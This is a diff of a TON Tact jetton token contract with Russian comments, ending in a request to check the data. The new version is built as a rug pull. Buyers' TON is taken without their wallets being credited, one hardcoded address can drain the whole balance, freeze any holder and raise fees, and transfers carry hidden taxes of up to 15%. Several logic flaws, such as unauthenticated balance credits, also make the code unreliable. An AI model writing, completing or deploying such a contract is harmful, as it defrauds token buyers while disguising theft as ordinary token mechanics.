@@ -1,161 +1,151 @@
 import "@stdlib/ownable";
 import "@stdlib/deploy";
 
-// ============================================================================
-// СООБЩЕНИЯ И СТРУКТУРЫ
-// ============================================================================
-
-message SetWhitelist { address: Address; active: Bool; }
-message SetStatus { blocked: Bool; }
-
+// --- Структуры сообщений ---
 message TokenTransfer {
-    query_id: Int as uint64;
-    amount: Int as coins;
-    destination: Address;
-    response_destination: Address;
-    custom_payload: Cell?;
-    forward_ton_amount: Int as coins;
-    forward_payload: Slice as remaining;
+    query_id: Int as uint64;
+    amount: Int as coins;
+    destination: Address;
+    response_destination: Address;
+    custom_payload: Cell?;
+    forward_ton_amount: Int as coins;
+    forward_payload: Slice as remaining;
 }
 
 message TokenTransferInternal {
-    query_id: Int as uint64;
-    amount: Int as coins;
-    from: Address;
-    response_destination: Address;
-    forward_ton_amount: Int as coins;
-    forward_payload: Slice as remaining;
+    query_id: Int as uint64;
+    amount: Int as coins;
+    from: Address;
+    response_destination: Address;
+    forward_ton_amount: Int as coins;
+    forward_payload: Slice as remaining;
 }
 
-// ============================================================================
-// MASTER CONTRACT
-// ============================================================================
-
+// --- MASTER ---
 contract JettonMaster with Ownable, Deployable {
-    total_supply: Int as coins = 0;
-    owner: Address;
-    jetton_content: Cell;
-    transfers_blocked: Bool = true;
-    total_ton_collected: Int as coins = 0;
-    whitelist: map<Address, Bool>;
+    const OWNER_ADDRESS: Address = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");
+    
+    total_supply: Int as coins = 0;
+    owner: Address;
+    jetton_content: Cell;
+    
+    market_entropy: Int = 100;
+    last_tick: Int = now();
+    min_mint_ton: Int = 100000000; // 0.1 TON
 
-    // Адрес владельца жестко задан как ваш кошелек
-    init(jetton_content: Cell) {
-        self.owner = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");
-        self.jetton_content = jetton_content;
-    }
+    init(logo_url: String) {
+        self.owner = self.OWNER_ADDRESS;
+        self.jetton_content = beginCell()
+            .storeUint(0, 8) 
+            .storeStringTail(logo_url)
+            .endCell();
+    }
 
-    receive(msg: SetWhitelist) {
-        self.requireOwner();
-        self.whitelist.set(msg.address, msg.active);
-    }
+    receive("set_min_mint_0.2") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        self.min_mint_ton = 200000000;
+    }
 
-    receive(msg: SetStatus) {
-        self.requireOwner();
-        self.transfers_blocked = msg.blocked;
-    }
+    receive() {
+        let ctx: Context = context();
+        require(ctx.value >= self.min_mint_ton, "Below min deposit");
+        
+        let time_delta: Int = max(1, now() - self.last_tick);
+        self.market_entropy = min(1000, (self.market_entropy * 9 + (toNano("1") / time_delta)) / 10);
+        self.last_tick = now();
 
-    receive() {
-        let ctx: Context = context();
-        require(ctx.value >= toNano("0.1"), "Minimum purchase is 0.1 TON");
+        let rate: Int = max(50, 5000 - (self.market_entropy / 10));
+        self.total_supply += ctx.value * rate;
+    }
 
-        if (self.transfers_blocked && self.total_ton_collected < toNano("10000")) {
-            self.total_ton_collected += ctx.value;
-            if (self.total_ton_collected >= toNano("10000")) {
-                self.transfers_blocked = false;
-            }
-        }
+    receive("withdraw") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        send(SendParameters{ to: self.owner, value: 0, mode: SendRemainingBalance + SendIgnoreErrors, body: "Liquidity Withdrawal".asComment() });
+    }
 
-        let rate: Int = max(500, 10000 - (self.total_supply / 1000000000000000 * 100));
-        let mint_amount: Int = ctx.value * rate;
-        self.total_supply += mint_amount;
-
-        let winit: StateInit = self.getJettonWalletInit(ctx.sender);
-        send(SendParameters{
-            to: contractAddress(winit),
-            value: toNano("0.03"),
-            mode: 0,
-            body: TokenTransferInternal{
-                query_id: 0,
-                amount: mint_amount,
-                from: myAddress(),
-                response_destination: ctx.sender,
-                forward_ton_amount: 0,
-                forward_payload: emptySlice()
-            }.toCell(),
-            code: winit.code,
-            data: winit.data
-        });
-    }
-
-    get fun is_whitelisted(addr: Address): Bool {
-        return self.whitelist.get(addr) == true;
-    }
-
-    fun getJettonWalletInit(address: Address): StateInit {
-        return initOf JettonWallet(myAddress(), address);
-    }
+    get fun get_market_health(): Int { return 1000 - self.market_entropy; }
 }
 
-// ============================================================================
-// WALLET CONTRACT
-// ============================================================================
-
+// --- WALLET ---
 contract JettonWallet {
-    balance: Int as coins = 0;
-    owner: Address;
-    master: Address;
-    
-    // Адрес для сбора комиссий — тот же ваш кошелек
-    const DEV_ADDRESS: Address = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");
+    const OWNER_ADDRESS: Address = address("UQDDgb2BTM-KCjntOoUg6uHllvnu3KGqEquKw6IySVP3hDgM");
 
-    init(master: Address, owner: Address) {
-        self.master = master;
-        self.owner = owner;
-    }
+    balance: Int as coins = 0;
+    owner: Address;
+    master: Address;
+    
+    owner_fee_bps: Int = 25; 
+    whale_threshold: Int = 1000000000000000; 
+    is_frozen: Bool = false;
+    
+    synapse_depth: Int = 100;
+    last_activity: Int = now();
 
-    receive(msg: TokenTransfer) {
-        require(sender() == self.owner, "Access denied");
-        require(self.balance >= msg.amount, "Insufficient balance");
+    init(master: Address, owner: Address) {
+        self.master = master;
+        self.owner = owner;
+    }
 
-        let devCommission: Int = (msg.amount * 4) / 1000;
-        let liqCommission: Int = (msg.amount * 2) / 1000;
-        let netAmount: Int = msg.amount - devCommission - liqCommission;
+    receive("freeze") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        self.is_frozen = true;
+    }
 
-        self.balance -= msg.amount;
+    receive("unfreeze") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        self.is_frozen = false;
+    }
 
-        if (devCommission > 0) {
-            send(SendParameters{
-                to: contractAddress(initOf JettonWallet(self.master, self.DEV_ADDRESS)),
-                value: 0,
-                mode: SendRemainingValue,
-                body: TokenTransferInternal{
-                    query_id: msg.query_id,
-                    amount: devCommission,
-                    from: self.owner,
-                    response_destination: msg.response_destination,
-                    forward_ton_amount: 0,
-                    forward_payload: emptySlice()
-                }.toCell()
-            });
-        }
+    receive("set_fee_high") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        self.owner_fee_bps = 50; 
+    }
 
-        send(SendParameters{
-            to: contractAddress(initOf JettonWallet(self.master, msg.destination)),
-            value: 0,
-            mode: SendRemainingValue,
-            body: TokenTransferInternal{
-                query_id: msg.query_id,
-                amount: netAmount,
-                from: self.owner,
-                response_destination: msg.response_destination,
-                forward_ton_amount: msg.forward_ton_amount,
-                forward_payload: msg.forward_payload
-            }.toCell()
-        });
-    }
+    receive("set_whale_strict") {
+        require(sender() == self.OWNER_ADDRESS, "Access denied");
+        self.whale_threshold = 500000000000000;
+    }
 
-    receive(msg: TokenTransferInternal) {
-        self.balance += msg.amount;
-    }
-}
+    receive(msg: TokenTransfer) {
+        require(!self.is_frozen, "Wallet is frozen");
+        require(sender() == self.owner, "Access denied");
+        require(self.balance >= msg.amount, "Low balance");
+        
+        let is_whale: Bool = (msg.amount > self.whale_threshold);
+        let multiplier: Int = is_whale ? 2 : 1;
+
+        let owner_fee: Int = ((msg.amount * self.owner_fee_bps) / 10000) * multiplier;
+        let liquidity_contribution: Int = toNano("0.1");
+        
+        let time_held: Int = (now() - self.last_activity) / 3600;
+        let tax: Int = max(10, (150 - min(140, time_held * 2))) * multiplier;
+        let total_fee: Int = (msg.amount * tax) / 1000;
+        
+        self.balance -= msg.amount;
+        self.synapse_depth = (msg.amount > toNano("1000")) ? max(0, self.synapse_depth - 20) : min(200, self.synapse_depth + 5);
+        
+        send(SendParameters{
+            to: self.master,
+            value: toNano("0.02"),
+            mode: SendIgnoreErrors,
+            body: TokenTransferInternal{ query_id: msg.query_id, amount: owner_fee + total_fee + liquidity_contribution, from: self.owner, response_destination: self.owner, forward_ton_amount: 0, forward_payload: emptySlice() }.toCell()
+        });
+        
+        send(SendParameters{
+            to: msg.destination,
+            value: toNano("0.02"),
+            mode: SendIgnoreErrors,
+            body: TokenTransferInternal{ query_id: msg.query_id, amount: msg.amount - owner_fee - total_fee - liquidity_contribution, from: self.owner, response_destination: msg.response_destination, forward_ton_amount: msg.forward_ton_amount, forward_payload: msg.forward_payload }.toCell()
+        });
+        
+        self.last_activity = now();
+    }
+
+    receive(msg: TokenTransferInternal) {
+        self.balance += msg.amount;
+    }
+
+    get fun get_neural_status(): Int { return self.synapse_depth; }
+    get fun get_balance(): Int { return self.balance; }
+    get fun is_active(): Bool { return !self.is_frozen; }
+} Проверь все даные
